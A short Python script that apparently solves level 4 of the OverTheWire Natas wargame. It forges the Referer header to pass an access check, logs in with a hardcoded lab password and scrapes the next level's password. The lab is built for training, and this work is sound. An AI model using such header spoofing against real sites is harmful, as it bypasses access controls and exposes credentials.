import requests
import re

url = "http://natas4.natas.labs.overthewire.org"

head = {
    "Referer": "http://natas5.natas.labs.overthewire.org/"
}

def exp():
    r = requests.get(url, auth=('natas4', 'QryZXc2e0zahULdHrtHxzyYkj59kUxLQ'), verify=False, headers=head)
    if r.status_code == 200:
        password = re.findall('natas5 is (.*)', r.text)[0]
        print("Password for natas5: " + password)

if __name__ == "__main__":
    exp()
